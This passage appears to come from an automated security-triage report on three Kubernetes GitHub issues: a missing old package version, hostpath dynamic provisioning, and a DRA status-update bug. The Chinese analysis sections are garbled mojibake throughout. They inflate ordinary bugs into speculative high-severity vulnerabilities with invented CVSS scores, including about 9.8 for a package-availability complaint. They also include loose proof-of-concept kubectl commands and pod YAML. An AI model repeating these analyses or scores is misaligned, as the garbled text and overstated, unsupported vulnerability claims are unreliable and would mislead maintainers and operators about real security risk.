æ‚¨æä¾›çš„å®‰è£…è„šæœ¬ä¸­æ›´æ”¹æ–‡ä»¶æƒé™çš„åšæ³•å­˜åœ¨ä¸¥é‡çš„å®‰å…¨éšæ‚£ï¼Œå¯èƒ½è¢«æœ¬åœ°æ”»å‡»è€…åˆ©ç”¨ï¼Œé€ æˆç³»ç»Ÿè¢«å…¥ä¾µæˆ–æ•°æ®æŸåã€‚å»ºè®®æŒ‰ç…§ä»¥ä¸Šæªæ–½ä¿®æ”¹è„šæœ¬ï¼Œç¡®ä¿ç³»ç»Ÿå®‰å…¨ã€‚

---

## Issue #123830 unable to pull old version of Kubernetes|1.23.15-00

- Issue é“¾æ¥ï¼š[#123830](https://github.com/kubernetes/kubernetes/issues/123830)

### Issue å†…å®¹

#### What happened?

The user encountered difficulty adding a new node to the Kubernetes cluster due to the inability to locate the necessary packages on the repository.

#### What did you expect to happen?

I expected to successfully locate and access package version 1.23.15 on the repository when adding the new node to the Kubernetes cluster.

#### How can we reproduce it (as minimally and precisely as possible)?

    Attempt to add a new node to the Kubernetes cluster.
    During the node addition process, specify the use of package version 1.23.15.
    Observe that the package cannot be located on the repository, resulting in a failure to add the new node to the cluster.

#### Anything else we need to know?

The operating system running on the node where the issue occurred is Ubuntu 22.04.3 LTS.
 Versions of Kubernetes are 1.23.15.
My Production server is still running on 1.23.15 and wont be able to upgrade it to the newer versions soon.

Its critical that the new machine is added to the cluster.

In case there is no way access the old packages .Kindly help us how we can bring this node and add them.



#### Kubernetes version

Client Version: version.Info{Major:"1", Minor:"23", GitVersion:"v1.23.15", GitCommit:"b84cb8ab29366daa1bba65bc67f54de2f6c34848", GitTreeState:"clean", BuildDate:"2022-12-08T10:49:13Z", GoVersion:"go1.17.13", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"23", GitVersion:"v1.23.15", GitCommit:"b84cb8ab29366daa1bba65bc67f54de2f6c34848", GitTreeState:"clean", BuildDate:"2022-12-08T10:42:57Z", GoVersion:"go1.17.13", Compiler:"gc", Platform:"linux/amd64"}


#### Cloud provider

<details>

</details>


#### OS version

Ubuntu 22.04

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

/sig release


### åˆ†æç»“æœ

è¿™ä¸ªIssueå­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå…·ä½“åˆ†æå¦‚ä¸‹ï¼š

**1. é£é™©å¯è¢«æ”»å‡»è€…åˆ©ç”¨**

ç”¨æˆ·æ— æ³•ä»å®˜æ–¹ä»“åº“è·å–Kubernetesæ—§ç‰ˆæœ¬ï¼ˆ1.23.15ï¼‰çš„è½¯ä»¶åŒ…ï¼Œè¿™å¯èƒ½å¯¼è‡´ä»¥ä¸‹é£é™©ï¼š

- **éå®˜æ–¹æ¥æºä¸‹è½½é£é™©**ï¼šç”±äºæ— æ³•ä»å®˜æ–¹æ¸ é“è·å–æ‰€éœ€ç‰ˆæœ¬ï¼Œç”¨æˆ·å¯èƒ½è¢«è¿«ä»éå®˜æ–¹æˆ–ç¬¬ä¸‰æ–¹æ¥æºä¸‹è½½è¯¥è½¯ä»¶åŒ…ã€‚æ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œåœ¨äº’è”ç½‘æˆ–æ¶æ„ä»“åº“ä¸­æä¾›ä¼ªé€ çš„ã€è¢«æ¤å…¥æ¶æ„ä»£ç çš„Kubernetes 1.23.15è½¯ä»¶åŒ…ã€‚

- **ä¾›åº”é“¾æ”»å‡»**ï¼šå¦‚æœç”¨æˆ·ä»ä¸å—ä¿¡ä»»çš„æ¥æºä¸‹è½½å¹¶å®‰è£…äº†è¢«ç¯¡æ”¹çš„è½¯ä»¶åŒ…ï¼Œæ”»å‡»è€…å°±æœ‰æœºä¼šåœ¨ç”¨æˆ·çš„ç³»ç»Ÿä¸­æ‰§è¡Œæ¶æ„æ“ä½œã€‚è¿™æ˜¯ä¸€ç§å…¸å‹çš„ä¾›åº”é“¾æ”»å‡»æ–¹å¼ã€‚

**2. é£é™©å¯èƒ½æˆä¸ºæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä¸”CVSSè¯„åˆ†åœ¨Highä»¥ä¸Š**

- **æ¼æ´åˆ†ç±»**ï¼šè¿™å±äºä¾›åº”é“¾é£é™©ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€æƒé™æå‡æˆ–ä¿¡æ¯æ³„éœ²ç­‰ä¸¥é‡åæœã€‚

- **CVSSè¯„åˆ†**ï¼šæ ¹æ®CVSS v3.1æ ‡å‡†ï¼Œè‹¥æ”»å‡»è€…èƒ½å¤Ÿè¿œç¨‹æ‰§è¡Œä»£ç ï¼Œå½±å“åˆ°ç³»ç»Ÿæœºå¯†æ€§ã€å®Œæ•´æ€§å’Œå¯ç”¨æ€§ï¼ŒåŸºç¡€è¯„åˆ†å¯èƒ½è¾¾åˆ°æˆ–è¶…è¿‡7.0ï¼ˆHighçº§åˆ«ï¼‰ã€‚ä¾‹å¦‚ï¼Œè‹¥æ”»å‡»å‘é‡ä¸ºç½‘ç»œï¼ˆNetworkï¼‰ï¼Œæ”»å‡»å¤æ‚åº¦ä½ï¼Œæ— éœ€ç‰¹æƒæˆ–ç”¨æˆ·äº¤äº’ï¼Œå½±å“é«˜ï¼Œå¯ç”¨æ€§å½±å“é«˜ï¼Œç»¼åˆè¯„åˆ†å¯èƒ½åœ¨9.8ï¼ˆCriticalï¼‰å·¦å³ã€‚

**å¯èƒ½çš„å½±å“**

- **è¿œç¨‹ä»£ç æ‰§è¡Œ**ï¼šæ”»å‡»è€…å¯åœ¨å—å®³è€…çš„èŠ‚ç‚¹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå®Œå…¨æ§åˆ¶èŠ‚ç‚¹ã€‚

- **é›†ç¾¤å®‰å…¨ç ´å**ï¼šå—æ§èŠ‚ç‚¹å¯èƒ½ä½œä¸ºæ”»å‡»å…¥å£ï¼Œå¨èƒæ•´ä¸ªKubernetesé›†ç¾¤çš„å®‰å…¨ã€‚

- **æ•°æ®æ³„éœ²**ï¼šæ•æ„Ÿæ•°æ®å¯èƒ½è¢«æ”»å‡»è€…è·å–ï¼ŒåŒ…æ‹¬æœºå¯†ä¿¡æ¯ã€å‡­è¯ç­‰ã€‚

- **æŒä¹…æ€§åé—¨**ï¼šæ”»å‡»è€…å¯éƒ¨ç½²æŒä¹…æ€§åé—¨ï¼Œé•¿æœŸç›‘æ§æˆ–æ§åˆ¶ç³»ç»Ÿã€‚

**Proof of Conceptï¼ˆæ¦‚å¿µéªŒè¯ï¼‰**

1. **æ”»å‡»è€…å‡†å¤‡æ¶æ„è½¯ä»¶åŒ…**

   æ”»å‡»è€…æ„å»ºä¸€ä¸ªä¼ªè£…æˆKubernetes 1.23.15ç‰ˆæœ¬çš„æ¶æ„è½¯ä»¶åŒ…ï¼Œå…¶ä¸­æ¤å…¥äº†åé—¨ç¨‹åºæˆ–æ¶æ„è„šæœ¬ã€‚

2. **å‘å¸ƒåˆ°éå®˜æ–¹æ¸ é“**

   æ”»å‡»è€…å°†è¯¥æ¶æ„è½¯ä»¶åŒ…ä¸Šä¼ åˆ°å…¬å…±çš„åŒ…ä»“åº“ã€æ–‡ä»¶å…±äº«å¹³å°ï¼Œæˆ–å»ºç«‹ä¸€ä¸ªçœ‹ä¼¼åˆæ³•çš„è½¯ä»¶ä¸‹è½½ç«™ç‚¹ï¼Œä¼˜åŒ–æœç´¢å¼•æ“æ’åï¼Œè¯±å¯¼ç”¨æˆ·ä¸‹è½½ã€‚

3. **ç”¨æˆ·ä¸‹è½½å¹¶å®‰è£…**

   ç”¨æˆ·ç”±äºæ— æ³•ä»å®˜æ–¹æ¸ é“è·å–æ‰€éœ€ç‰ˆæœ¬ï¼Œæœç´¢åæ‰¾åˆ°æ”»å‡»è€…æä¾›çš„ä¸‹è½½é“¾æ¥ï¼Œä¸‹è½½äº†è¢«ç¯¡æ”¹çš„Kubernetesè½¯ä»¶åŒ…ã€‚

4. **æ¶æ„ä»£ç æ‰§è¡Œ**

   åœ¨å®‰è£…æˆ–è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ¶æ„è½¯ä»¶åŒ…ä¸­çš„åé—¨ç¨‹åºè¢«æ‰§è¡Œï¼Œæ”»å‡»è€…è·å¾—å¯¹ç”¨æˆ·ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚

5. **æ”»å‡»è€…æ§åˆ¶**

   æ”»å‡»è€…åˆ©ç”¨è·å¾—çš„æƒé™ï¼Œæ‰§è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ï¼Œå¦‚æ¨ªå‘ç§»åŠ¨ã€æ•°æ®çªƒå–ã€ç ´åæœåŠ¡ç­‰ã€‚

**å»ºè®®æªæ–½**

- **ä»å®˜æ–¹æ¸ é“è·å–è½¯ä»¶åŒ…**

  ç¡®ä¿ä»…ä»Kuberneteså®˜æ–¹æˆ–å—ä¿¡ä»»çš„é•œåƒæºè·å–è½¯ä»¶åŒ…ã€‚å¦‚å®˜æ–¹å·²ä¸æä¾›æ—§ç‰ˆæœ¬ä¸‹è½½ï¼Œå¯è”ç³»å®˜æ–¹æ”¯æŒæˆ–å¯»æ‰¾å¯ä¿¡çš„å†å²ç‰ˆæœ¬å­˜å‚¨ã€‚

- **éªŒè¯è½¯ä»¶åŒ…å®Œæ•´æ€§**

  ä¸‹è½½è½¯ä»¶åŒ…åï¼Œä½¿ç”¨å®˜æ–¹æä¾›çš„æ ¡éªŒå’Œæˆ–ç­¾åè¿›è¡Œå®Œæ•´æ€§éªŒè¯ï¼Œç¡®ä¿è½¯ä»¶åŒ…æœªè¢«ç¯¡æ”¹ã€‚

- **è®¡åˆ’å‡çº§**

  åˆ¶å®šè®¡åˆ’ï¼Œå°½å¿«å°†Kubernetesé›†ç¾¤å‡çº§åˆ°å—æ”¯æŒçš„æœ€æ–°ç¨³å®šç‰ˆæœ¬ï¼Œä»¥è·å–å®‰å…¨æ›´æ–°å’Œæ”¯æŒã€‚

- **åŠ å¼ºå®‰å…¨æ„è¯†**

  æ•™è‚²å›¢é˜Ÿæˆå‘˜ï¼Œé¿å…ä»æœªçŸ¥æˆ–ä¸å¯ä¿¡çš„æ¥æºä¸‹è½½å’Œå®‰è£…è½¯ä»¶ï¼Œé˜²èŒƒä¾›åº”é“¾æ”»å‡»ã€‚

---

## Issue #123804 Should we deprecate and remove the in-tree volume plugin hostpath dynamic provisioning feature?

- Issue é“¾æ¥ï¼š[#123804](https://github.com/kubernetes/kubernetes/issues/123804)

### Issue å†…å®¹

The in-tree volume plugin hostpath supports dynamic provisioning a volume for a claim when the kube-controller-manager starts with `--enable-hostpath-provisioner=true`.

It creates a local /tmp/%/%s directory as a new PersistentVolume, default /tmp/hostpath_pv/%s. It is meant for development and testing only and WILL NOT WORK in a multi-node cluster.

There are 3 problems I want to talk about:

1. e2e tests don't have a test case for hostpath dynamic provisioning. https://github.com/kubernetes/kubernetes/blob/2ec63e0d28951bb525a5bce0d9459afa1c71c0bd/test/e2e/storage/drivers/in_tree.go#L649
    ```golang
    var _ storageframework.TestDriver = &hostPathDriver{}
    var _ storageframework.PreprovisionedVolumeTestDriver = &hostPathDriver{}
    var _ storageframework.InlineVolumeTestDriver = &hostPathDriver{}
    ```
    the hostPathDriver doesn't implement the `DynamicPVTestDriver` interface, so the e2e tests don't have a test case for in-tree hostpath dynamic provisioning.
2. The cluster created by kubeadm doesn't make the feature work as expected. because the kube-controller-manager pod doesn't have a hostPath volume mounted at /tmp/hostpath_pv. https://github.com/kubernetes/kubernetes/blob/2ec63e0d28951bb525a5bce0d9459afa1c71c0bd/cmd/kubeadm/app/phases/controlplane/volumes.go#L64
    ```golang
    // HostPath volumes for the controller manager
    // Read-only mount for the certificates directory
    // TODO: Always mount the K8s Certificates directory to a static path inside of the container
    mounts.NewHostPathMount(kubeadmconstants.KubeControllerManager, kubeadmconstants.KubeCertificatesVolumeName, cfg.CertificatesDir, cfg.CertificatesDir, true, &hostPathDirectoryOrCreate)
    // Read-only mount for the ca certs (/etc/ssl/certs) directory
    mounts.NewHostPathMount(kubeadmconstants.KubeControllerManager, caCertsVolumeName, caCertsVolumePath, caCertsVolumePath, true, &hostPathDirectoryOrCreate)
    // Read-only mount for the controller manager kubeconfig file
    controllerManagerKubeConfigFile := filepath.Join(kubeadmconstants.KubernetesDir, kubeadmconstants.ControllerManagerKubeConfigFileName)
    mounts.NewHostPathMount(kubeadmconstants.KubeControllerManager, kubeadmconstants.KubeConfigVolumeName, controllerManagerKubeConfigFile, controllerManagerKubeConfigFile, true, &hostPathFileOrCreate)
    // Mount for the flexvolume directory (/usr/libexec/kubernetes/kubelet-plugins/volume/exec by default)
    // Flexvolume dir must NOT be readonly as it is used for third-party plugins to integrate with their storage backends via unix domain socket.
    flexvolumeDirVolumePath, idx := kubeadmapi.GetArgValue(cfg.ControllerManager.ExtraArgs, "flex-volume-plugin-dir", -1)
    if idx == -1 {
      flexvolumeDirVolumePath = defaultFlexvolumeDirVolumePath
    }
    mounts.NewHostPathMount(kubeadmconstants.KubeControllerManager, flexvolumeDirVolumeName, flexvolumeDirVolumePath, flexvolumeDirVolumePath, false, &hostPathDirectoryOrCreate)
    ```
3. There are lots of projects using `--enable-hostpath-provisioner=true`. Please see https://cs.k8s.io/?q=enable-hostpath-provisioner&i=nope&files=&excludeFiles=&repos=. But they use kubeadm to create a cluster, so the dynamic provisioning of in-tree hostpath is never used by those projects. I don't know why they enable the flag.

There are 3 in-tree plugins that support dynamic provisioning: hostpath, rbd (removed in 1.31), and portworxVolume (will be removed in a future release once its csi migration is completed). 

Now, the community has various CSI drivers users can use for dynamic provisioning. So let us deprecate and remove the in-tree volume plugin hostpath dynamic provisioning feature if the feature is never used.

What do you think? 

/cc @xing-yang @jsafrane @pacoxu @neolit123

/sig storage
/kind bug
/area kubeadm

related-to: [add some e2e test for in-tree volume plugin to verify HonorPVReclaimPolicy](https://github.com/kubernetes/kubernetes/pull/123151#issuecomment-1932971681)
```[tasklist]
#### Tasks
- [ ] Mark the  --enable-hostpath-provisioner option in KCM as deprecated
- [ ] Remove ENABLE_HOSTPATH_PROVISIONER from hack/local-up-cluster.sh and remove --enable-hostpath-provisioner option in 1.32
```


### åˆ†æç»“æœ

å­˜åœ¨å®‰å…¨é£é™©ã€‚

**åŸå› åŠå¯èƒ½çš„å½±å“ï¼š**

å¯ç”¨ `--enable-hostpath-provisioner=true`ï¼Œä¼šä½¿ `kube-controller-manager` æ”¯æŒ hostPath å·çš„åŠ¨æ€ä¾›åº”ã€‚å½“æ­¤åŠŸèƒ½å¯ç”¨åï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡åˆ›å»º `PersistentVolumeClaim`ï¼ˆPVCï¼‰ï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºå¯¹åº”çš„ `PersistentVolume`ï¼ˆPVï¼‰ï¼Œå¹¶å°†ä¸»æœºç›®å½•ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯ `/tmp/hostpath_pv/<volume-name>`ï¼‰æŒ‚è½½åˆ° Pod ä¸­ã€‚

ç”±äº hostPath å·ç›´æ¥è®¿é—®ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåˆ›å»ºæˆ–æ“çºµ PVCï¼Œåˆ™å¯èƒ½åˆ©ç”¨è¯¥åŠŸèƒ½è®¿é—®ä¸»æœºä¸Šçš„æ•æ„Ÿæ–‡ä»¶æˆ–ç›®å½•ã€‚è¿™å¯èƒ½å¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜ï¼š

1. **æœªç»æˆæƒçš„ä¸»æœºæ–‡ä»¶ç³»ç»Ÿè®¿é—®**ï¼šæ”»å‡»è€…å¯èƒ½é€šè¿‡åˆ›å»ºç‰¹åˆ¶çš„ PVCï¼Œä½¿å¾— Pod æŒ‚è½½ä¸»æœºä¸Šçš„æ•æ„Ÿç›®å½•ã€‚
2. **ç‰¹æƒå‡çº§**ï¼šé€šè¿‡è®¿é—®å…³é”®çš„ç³»ç»Ÿæ–‡ä»¶æˆ–ç›®å½•ï¼Œæ”»å‡»è€…å¯èƒ½æå‡åœ¨ä¸»æœºä¸Šçš„æƒé™ã€‚
3. **æ•°æ®æ³„éœ²å’Œç¯¡æ”¹**ï¼šæ”»å‡»è€…å¯ä»¥è¯»å–æˆ–ä¿®æ”¹ä¸»æœºä¸Šçš„æ•°æ®ï¼Œå¯¼è‡´æ•°æ®æ³„éœ²æˆ–ç¯¡æ”¹ã€‚

**æ¼æ´åˆ©ç”¨çš„å¯èƒ½æ€§ï¼š**

- **å¯è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šå¦‚æœé›†ç¾¤ä¸­å­˜åœ¨ä¸å—ä¿¡ä»»çš„ç”¨æˆ·æˆ–å¤šç§Ÿæˆ·åœºæ™¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºæ¶æ„çš„ PVC å’Œ Podã€‚
- **å¯èƒ½æˆä¸ºæ¼æ´å¹¶åˆ†é… CVE ç¼–å·**ï¼šè¯¥é£é™©æ»¡è¶³åˆ†é… CVE çš„æ¡ä»¶ï¼Œä¸”æ ¹æ® CVSS 3.1 è¯„åˆ†æ ‡å‡†ï¼Œä¸¥é‡ç¨‹åº¦åœ¨ High ä»¥ä¸Šã€‚

**CVSS 3.1 è¯„åˆ†ï¼ˆä¼°è®¡ï¼‰ï¼š**

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNetworkï¼ŒNï¼‰
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLowï¼ŒLï¼‰
- **ç‰¹æƒè¦æ±‚ï¼ˆPRï¼‰**ï¼šä½ï¼ˆLowï¼ŒLï¼‰
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— ï¼ˆNoneï¼ŒNï¼‰
- **ä½œç”¨èŒƒå›´ï¼ˆSï¼‰**ï¼šæ”¹å˜ï¼ˆChangedï¼ŒCï¼‰
- **æœºå¯†æ€§ï¼ˆCï¼‰**ï¼šé«˜ï¼ˆHighï¼ŒHï¼‰
- **å®Œæ•´æ€§ï¼ˆIï¼‰**ï¼šé«˜ï¼ˆHighï¼ŒHï¼‰
- **å¯ç”¨æ€§ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHighï¼ŒHï¼‰

ç»¼åˆè¯„åˆ†ï¼š**ä¸¥é‡ç¨‹åº¦ Highï¼ˆé«˜ï¼‰**ï¼Œå¾—åˆ†çº¦ 8.8ã€‚

**Proof of Conceptï¼ˆæ¦‚å¿µéªŒè¯ï¼‰ï¼š**

1. **æ”»å‡»å‰æ**ï¼šé›†ç¾¤å¯ç”¨äº† `--enable-hostpath-provisioner=true`ï¼Œä¸”æ”»å‡»è€…æœ‰æƒé™åˆ›å»º PVC å’Œ Podã€‚

2. **æ”»å‡»æ­¥éª¤**ï¼š

   - **Step 1**ï¼šæ”»å‡»è€…åˆ›å»ºä¸€ä¸ª PVCï¼Œè¯·æ±‚åŠ¨æ€ä¾›åº”ä¸€ä¸ª PVã€‚

     ```yaml
     apiVersion: v1
     kind: PersistentVolumeClaim
     metadata:
       name: malicious-pvc
     spec:
       accessModes:
         - ReadWriteOnce
       resources:
         requests:
           storage: 10Gi
     ```

   - **Step 2**ï¼šæ”»å‡»è€…åˆ›å»ºä¸€ä¸ª Podï¼Œä½¿ç”¨ä¸Šè¿° PVCï¼Œå¹¶å°è¯•è®¿é—®ä¸»æœºæ–‡ä»¶ç³»ç»Ÿã€‚

     ```yaml
     apiVersion: v1
     kind: Pod
     metadata:
       name: malicious-pod
     spec:
       containers:
         - name: attacker
           image: alpine
           command: ["/bin/sh"]
           args: ["-c", "sleep 3600"]
           volumeMounts:
             - mountPath: /host
               name: host-volume
       volumes:
         - name: host-volume
           persistentVolumeClaim:
             claimName: malicious-pvc
     ```

   - **Step 3**ï¼šè¿›å…¥ Podï¼Œè®¿é—®æŒ‚è½½çš„ `/host` ç›®å½•ã€‚

     ```bash
     kubectl exec -it malicious-pod -- /bin/sh
     ```

     åœ¨ Pod å†…éƒ¨ï¼Œæ”»å‡»è€…å¯ä»¥æŸ¥çœ‹ `/host` ç›®å½•ä¸‹çš„å†…å®¹ï¼Œå¦‚æœä¾›åº”å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šåŒ…å«ä¸»æœºä¸Šçš„æ•æ„Ÿæ•°æ®ã€‚

3. **åˆ©ç”¨æ–¹å¼æ‰©å±•**ï¼š

   - å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿå½±å“åŠ¨æ€ä¾›åº”å™¨çš„è·¯å¾„ï¼ˆä¾‹å¦‚åˆ©ç”¨ç¬¦å·é“¾æ¥ç­‰æ‰‹æ®µï¼‰ï¼Œå¯èƒ½è®¿é—®ä¸»æœºä¸Šçš„ä»»æ„ç›®å½•ã€‚
   - æ”»å‡»è€…å¯èƒ½åœ¨ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¸Šå†™å…¥æ¶æ„æ–‡ä»¶ï¼Œå½±å“ä¸»æœºçš„è¿è¡Œã€‚

**å»ºè®®æªæ–½ï¼š**

- **åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç¦ç”¨è¯¥åŠŸèƒ½**ï¼šç”±äºè¯¥åŠŸèƒ½ä»…ç”¨äºå¼€å‘å’Œæµ‹è¯•ç¯å¢ƒï¼Œå»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸è¦å¯ç”¨ `--enable-hostpath-provisioner=true`ã€‚
- **ä¸¥æ ¼æ§åˆ¶ PVC çš„åˆ›å»ºæƒé™**ï¼šé™åˆ¶åªæœ‰å—ä¿¡ä»»çš„ç”¨æˆ·æˆ–æœåŠ¡è´¦æˆ·æ‰èƒ½åˆ›å»º PVCã€‚
- **ä½¿ç”¨ CSI é©±åŠ¨**ï¼šæ›¿ä»£ä½¿ç”¨å—æ”¯æŒä¸”å®‰å…¨çš„ CSI é©±åŠ¨è¿›è¡Œå­˜å‚¨çš„åŠ¨æ€ä¾›åº”ã€‚

**æ€»ç»“ï¼š**

Issue ä¸­æåˆ°çš„ `--enable-hostpath-provisioner=true` åŠŸèƒ½å­˜åœ¨å®‰å…¨é£é™©ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨è¿›è¡Œä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„æœªç»æˆæƒè®¿é—®ï¼Œå¯¼è‡´ä¸¥é‡çš„å®‰å…¨åæœã€‚å»ºè®®è°¨æ…ä½¿ç”¨è¯¥åŠŸèƒ½ï¼Œå¹¶é‡‡å–å¿…è¦çš„å®‰å…¨æªæ–½ã€‚

---

## Issue #123727 DRA API: don't allow changing object meta during status update

- Issue é“¾æ¥ï¼š[#123727](https://github.com/kubernetes/kubernetes/issues/123727)

### Issue å†…å®¹

#### What happened?

The strategy.go's `PrepareForStatusUpdate` was copied from some other, broken types. A call to `ResetObjectMetaForStatus` is missing and therefore, for example, finalizers can be changed during a status update. That is not supposed to be possible.

#### What did you expect to happen?

Object meta changes need to be removed during status updates.

#### How can we reproduce it (as minimally and precisely as possible)?

n/a

#### Anything else we need to know?

_No response_

#### Kubernetes version

Since 1.26 till at least 1.29.

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**åŸå› å’Œå¯èƒ½çš„å½±å“ï¼š**

åœ¨ Kubernetes ä¸­ï¼Œ`status` å­èµ„æºçš„æ›´æ–°åº”ä»…é™äºä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯ï¼Œè€Œä¸åº”å…è®¸ä¿®æ”¹å¯¹è±¡çš„å…ƒæ•°æ®ï¼ˆ`ObjectMeta`ï¼‰ã€‚ç„¶è€Œï¼Œç”±äº `PrepareForStatusUpdate` å‡½æ•°ä¸­ç¼ºå°‘å¯¹ `ResetObjectMetaForStatus` çš„è°ƒç”¨ï¼Œå¯¼è‡´åœ¨è¿›è¡Œ `status` æ›´æ–°æ—¶ï¼Œå…ƒæ•°æ®çš„ä¿®æ”¹æœªè¢«æ¸…é™¤ã€‚è¿™æ„å‘³ç€ç”¨æˆ·åœ¨æ›´æ–° `status` å­èµ„æºæ—¶ï¼Œä»ç„¶å¯ä»¥ä¿®æ”¹å¯¹è±¡çš„å…ƒæ•°æ®ï¼Œä¾‹å¦‚ `finalizers`ã€‚

**ä¸»è¦å®‰å…¨é£é™©ï¼š**

1. **æƒé™æå‡**ï¼šé€šå¸¸ï¼Œæ›´æ–°å¯¹è±¡çš„å…ƒæ•°æ®éœ€è¦æ›´é«˜çš„æƒé™ï¼Œè€Œæ›´æ–° `status` å­èµ„æºçš„æƒé™é€šå¸¸è¾ƒä½ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ä»…å…·æœ‰ `status` æ›´æ–°æƒé™ï¼Œæ¥ä¿®æ”¹å¯¹è±¡çš„å…ƒæ•°æ®ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚

2. **èµ„æºåˆ é™¤ä¿æŠ¤ç»•è¿‡**ï¼š`finalizers` ç”¨äºç¡®ä¿åœ¨åˆ é™¤èµ„æºå‰æ‰§è¡Œç‰¹å®šçš„æ¸…ç†æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ `status` æ›´æ–°æ—¶ç§»é™¤ `finalizers`ï¼Œä»è€Œç»•è¿‡èµ„æºçš„åˆ é™¤ä¿æŠ¤æœºåˆ¶ï¼Œå¯¼è‡´èµ„æºè¢«æ„å¤–åˆ é™¤æˆ–æœªæ­£ç¡®æ¸…ç†ã€‚

3. **å¹²æ‰°ç³»ç»Ÿè¡Œä¸º**ï¼šä¿®æ”¹å¯¹è±¡çš„å…¶ä»–å…ƒæ•°æ®ï¼ˆå¦‚æ ‡ç­¾æˆ–æ³¨è§£ï¼‰å¯èƒ½å½±å“ç³»ç»Ÿçš„è‡ªåŠ¨åŒ–æµç¨‹ã€å®‰å…¨ç­–ç•¥æˆ–ç›‘æ§ï¼Œä»è€Œé€ æˆæ›´å¤§çš„å½±å“ã€‚

æ ¹æ® CVSS 3.1 è¯„åˆ†æ ‡å‡†ï¼Œæ­¤æ¼æ´å¯èƒ½å¯¼è‡´æƒé™æå‡å’Œé‡è¦èµ„æºçš„æ„å¤–åˆ é™¤ï¼Œå…·æœ‰è¾ƒé«˜çš„ä¸¥é‡æ€§ï¼Œè¯„åˆ†å¯èƒ½è¾¾åˆ° High ç­‰çº§ã€‚

**æ¦‚å¿µéªŒè¯ï¼ˆProof of Conceptï¼‰ï¼š**

å‡è®¾å­˜åœ¨ä¸€ä¸ªæ”»å‡»è€…è´¦å·ï¼Œå…·æœ‰ä»¥ä¸‹æƒé™ï¼š

- å…è®¸å¯¹æŸä¸ªè‡ªå®šä¹‰èµ„æºï¼ˆå¦‚ DRA èµ„æºï¼‰çš„ `status` å­èµ„æºè¿›è¡Œæ›´æ–°ã€‚
- ä¸å…è®¸ä¿®æ”¹è¯¥èµ„æºçš„å…¶ä»–éƒ¨åˆ†ï¼ŒåŒ…æ‹¬å…ƒæ•°æ®ã€‚

æ”»å‡»æ­¥éª¤ï¼š

1. **æŸ¥çœ‹å½“å‰èµ„æºçš„çŠ¶æ€å’Œå…ƒæ•°æ®ï¼š**

   ```bash
   kubectl get dra <resource-name> -o yaml
   ```

2. **å°è¯•é€šè¿‡ `status` æ›´æ–°æ¥ä¿®æ”¹ `finalizers`ï¼š**

   åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ `patch.yaml`ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

   ```yaml
   metadata:
     finalizers: []
   ```

   ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š

   ```bash
   kubectl patch dra <resource-name> --type merge --patch-file patch.yaml --subresource='status'
   ```

3. **é¢„æœŸç»“æœï¼š**

   - æ­£å¸¸æƒ…å†µä¸‹ï¼ŒKubernetes åº”è¯¥æ‹’ç»åœ¨ `status` æ›´æ–°æ—¶ä¿®æ”¹ `metadata`ï¼Œæˆ–è€…è‡ªåŠ¨å¿½ç•¥å¯¹å…ƒæ•°æ®çš„ä¿®æ”¹ã€‚
   - ç„¶è€Œï¼Œç”±äºç¼ºå°‘å¯¹ `ResetObjectMetaForStatus` çš„è°ƒç”¨ï¼Œ`finalizers` è¢«æˆåŠŸç§»é™¤ã€‚

4. **éªŒè¯ç»“æœï¼š**

   å†æ¬¡æŸ¥çœ‹èµ„æºï¼Œç¡®è®¤ `finalizers` å·²è¢«ç§»é™¤ï¼š

   ```bash
   kubectl get dra <resource-name> -o yaml
   ```

**å¯èƒ½çš„å½±å“ï¼š**

- æ”»å‡»è€…å¯ä»¥åˆ é™¤å…³é”®çš„ `finalizer`ï¼Œå¯¼è‡´èµ„æºåœ¨æœªæ‰§è¡Œå¿…è¦æ¸…ç†æ“ä½œçš„æƒ…å†µä¸‹è¢«åˆ é™¤ã€‚
